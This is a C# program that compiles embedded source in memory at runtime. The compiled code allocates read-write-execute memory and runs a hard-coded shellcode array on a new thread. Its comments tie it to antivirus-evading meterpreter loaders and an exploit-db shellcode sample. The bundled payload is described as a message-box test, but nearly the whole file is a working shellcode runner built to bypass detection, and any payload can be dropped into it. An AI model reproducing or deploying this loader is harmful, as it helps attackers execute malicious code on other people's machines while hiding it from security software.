using System;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;


namespace exec
{
    class Program
    {
        //using https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/ 
        // and using https://raw.githubusercontent.com/vysec/FSharp-Shellcode/master/FSharp-Shellcode.fs as base
        // and using https://stackoverflow.com/questions/1361965/compile-simple-string 
        // shellcode test from https://www.exploit-db.com/exploits/28996/ for msgbox popup
        static void Main(string[] args)
        {
                string code= @"
                            using System;
                            using System.Reflection;
                            using System.Runtime.InteropServices;

                            namespace Namespace
                            {
                                class Program
                                {
                                    private static UInt32 MEM_COMMIT = 0x1000;
                                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                                            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

                                    [DllImport(""kernel32"")]
                                    private static extern IntPtr CreateThread(
                                        UInt32 lpThreadAttributes,
                                        UInt32 dwStackSize,
                                        UInt32 lpStartAddress,
                                        IntPtr param,
                                        UInt32 dwCreationFlags,
                                        ref UInt32 lpThreadId
                                        );

                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 WaitForSingleObject(
                                        IntPtr hHandle,
                                        UInt32 dwMilliseconds
                                        );

                                    public void run()
                                    {
                                        //Broken Byte msgbox test                                       
                                        byte[] shellcode = new byte[] {0x31,0xd2,0xb2,0x30,0x64,0x8b,0x12,0x8b,0x52,0x0c,0x8b,0x52,0x1c,0x8b,0x42,0x08,0x8b,0x72,0x20,0x8b,0x12,0x80,0x7e,0x0c,0x33,0x75,0xf2,0x89,0xc7,0x03,0x78,0x3c,0x8b,0x57,0x78,0x01,0xc2,0x8b,0x7a,0x20,0x01,0xc7,0x31,0xed,0x8b,0x34,0xaf,0x01,0xc6,0x45,0x81,0x3e,0x46,0x61,0x74,0x61,0x75,0xf2,0x81,0x7e,0x08,0x45,0x78,0x69,0x74,0x75,0xe9,0x8b,0x7a,0x24,0x01,0xc7,0x66,0x8b,0x2c,0x6f,0x8b,0x7a,0x1c,0x01,0xc7,0x8b,0x7c,0xaf,0xfc,0x01,0xc7,0x68,0x79,0x74,0x65,0x01,0x68,0x6b,0x65,0x6e,0x42,0x68,0x20,0x42,0x72,0x6f,0x89,0xe1,0xfe,0x49,0x0b,0x31,0xc0,0x51,0x50,0xff,0xd7};
                                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                                        IntPtr hThread = IntPtr.Zero;
                                        UInt32 threadId = 0;
                                        IntPtr pinfo = IntPtr.Zero;
                                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                                    }
                                }
                            }";
            function1(code, "Namespace", "Program", "run", false, null);
         }

        

        public static object function1(string code, string namespacename, string classname, string functionname, bool isstatic, params object[] args)
        {
            object returnval = null;
            Assembly asm = BuildAssembly(code);
            object instance = null;
            Type type = null;
            if (isstatic)
            {
                type = asm.GetType(namespacename + "." + classname);
            }
            else
            {
                instance = asm.CreateInstance(namespacename + "." + classname);
                type = instance.GetType();
            }
            MethodInfo method = type.GetMethod(functionname);
            returnval = method.Invoke(instance, args);
            return returnval;
        }

        private static Assembly BuildAssembly(string code)
        {
            Microsoft.CSharp.CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler compiler = provider.CreateCompiler();
            CompilerParameters compilerparams = new CompilerParameters();
            compilerparams.GenerateExecutable = false;
            compilerparams.GenerateInMemory = true;
            CompilerResults results = compiler.CompileAssemblyFromSource(compilerparams, code);
            return results.CompiledAssembly;
        }

    }
}
